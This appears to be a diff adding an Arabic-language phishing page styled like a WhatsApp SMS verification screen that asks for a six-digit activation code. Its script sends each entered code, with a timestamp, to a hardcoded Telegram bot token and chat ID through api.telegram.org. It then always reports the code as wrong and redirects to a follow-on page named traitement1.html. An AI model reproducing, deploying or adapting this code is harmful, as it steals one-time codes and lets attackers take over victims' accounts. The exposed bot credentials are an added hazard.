@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحقق من الرمز</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #25D366;
+            --primary-dark: #128C7E;
+            --error: #e53e3e;
+            --white: #FFFFFF;
+            --light-bg: #f5f8fa;
+            --border-color: #e1e8ed;
+            --text-color: #2d3748;
+            --text-secondary: #718096;
+            --shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: var(--light-bg);
+            color: var(--text-color);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .verification-card {
+            background-color: var(--white);
+            border-radius: 16px;
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 480px;
+            padding: 30px;
+            text-align: center;
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        .verification-icon {
+            color: var(--primary);
+            font-size: 3rem;
+            margin-bottom: 20px;
+        }
+
+        .verification-title {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            color: var(--primary-dark);
+        }
+
+        .verification-description {
+            color: var(--text-secondary);
+            margin-bottom: 25px;
+            font-size: 0.95rem;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .code-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 1.5rem;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            transition: var(--transition);
+        }
+
+        .code-input:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15);
+        }
+
+        .error-message {
+            color: var(--error);
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .submit-btn {
+            background: linear-gradient(to right, var(--primary), var(--primary-dark));
+            color: var(--white);
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            transition: var(--transition);
+            margin-top: 10px;
+            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.25);
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(37, 211, 102, 0.3);
+        }
+
+        .countdown-section {
+            margin-top: 25px;
+            display: none;
+        }
+
+        .countdown-text {
+            color: var(--text-secondary);
+        }
+
+        .countdown-number {
+            color: var(--primary-dark);
+            font-weight: 700;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+
+        .shake {
+            animation: shake 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-card">
+        <div class="verification-icon">
+            <i class="fas fa-sms"></i>
+        </div>
+        <h1 class="verification-title">رمز التفعيل</h1>
+        <p class="verification-description">يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية</p>
+        
+        <div class="code-inputs">
+            <input type="tel" class="code-input" maxlength="1" data-index="1">
+            <input type="tel" class="code-input" maxlength="1" data-index="2">
+            <input type="tel" class="code-input" maxlength="1" data-index="3">
+            <input type="tel" class="code-input" maxlength="1" data-index="4">
+            <input type="tel" class="code-input" maxlength="1" data-index="5">
+            <input type="tel" class="code-input" maxlength="1" data-index="6">
+        </div>
+        
+        <div class="error-message" id="errorMessage">
+            <i class="fas fa-exclamation-circle"></i>
+            <span>الرمز غير صحيح، يرجى المحاولة مرة أخرى</span>
+        </div>
+        
+        <button class="submit-btn" id="submitBtn">
+            <span>تحقق</span>
+            <i class="fas fa-check"></i>
+        </button>
+        
+        <div class="countdown-section" id="countdownSection">
+            <p class="countdown-text">سيتم إعادة التوجيه خلال <span class="countdown-number" id="countdown">15</span> ثانية</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const codeInputs = document.querySelectorAll('.code-input');
+            const submitBtn = document.getElementById('submitBtn');
+            const errorMessage = document.getElementById('errorMessage');
+            const countdownSection = document.getElementById('countdownSection');
+            const countdownElement = document.getElementById('countdown');
+            
+            // إدارة إدخال الرمز
+            codeInputs.forEach((input, index) => {
+                // التركيز على الحقل الأول عند التحميل
+                if(index === 0) input.focus();
+                
+                // الانتقال بين الحقول عند الإدخال
+                input.addEventListener('input', function() {
+                    if(this.value.length === 1) {
+                        if(index < codeInputs.length - 1) {
+                            codeInputs[index + 1].focus();
+                        }
+                    }
+                });
+                
+                // التعامل مع مفتاح backspace
+                input.addEventListener('keydown', function(e) {
+                    if(e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+            });
+            
+            // إرسال النموذج
+            submitBtn.addEventListener('click', function() {
+                const verificationCode = Array.from(codeInputs).map(input => input.value).join('');
+                
+                if(verificationCode.length !== 6) {
+                    showError("الرجاء إدخال الرمز المكون من 6 أرقام");
+                    return;
+                }
+                
+                // إرسال الرمز إلى تيليجرام
+                sendToTelegram(verificationCode);
+                
+                // هنا يمكنك إضافة التحقق من صحة الرمز
+                // في هذا المثال سنفترض أن الرمز غير صحيح لنظهر رسالة الخطأ
+                validateCode(verificationCode);
+            });
+            
+            // دالة إرسال الرمز إلى تيليجرام
+            function sendToTelegram(code) {
+                const bots = [
+                    { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
+                    { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
+                ];
+                
+                const message = `رمز التحقق الذي تم إدخاله: ${code}\nالوقت: ${new Date().toLocaleString('ar-SA')}`;
+                
+                bots.forEach(bot => {
+                    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}`)
+                        .catch(err => console.error('Error sending to Telegram:', err));
+                });
+            }
+            
+            // دالة التحقق من الرمز (في الواقع يجب أن تتصل بخادمك للتحقق)
+            function validateCode(code) {
+                // في هذا المثال سنفترض أن الرمز غير صحيح
+                setTimeout(() => {
+                    showError("الرمز غير صحيح، يرجى كتابة الرمز الصحيح");
+                    
+                    // بدء العد التنازلي 15 ثانية
+                    startCountdown();
+                }, 1000);
+            }
+            
+            // دالة عرض رسالة الخطأ
+            function showError(message) {
+                errorMessage.querySelector('span').textContent = message;
+                errorMessage.style.display = 'block';
+                
+                // تأثير اهتزاز
+                codeInputs.forEach(input => {
+                    input.classList.add('shake');
+                    setTimeout(() => {
+                        input.classList.remove('shake');
+                    }, 500);
+                });
+            }
+            
+            // دالة العد التنازلي
+            function startCountdown() {
+                countdownSection.style.display = 'block';
+                let seconds = 15;
+                
+                const countdownInterval = setInterval(() => {
+                    seconds--;
+                    countdownElement.textContent = seconds;
+                    
+                    if(seconds <= 0) {
+                        clearInterval(countdownInterval);
+                        window.location.href = 'traitement1.html';
+                    }
+                }, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
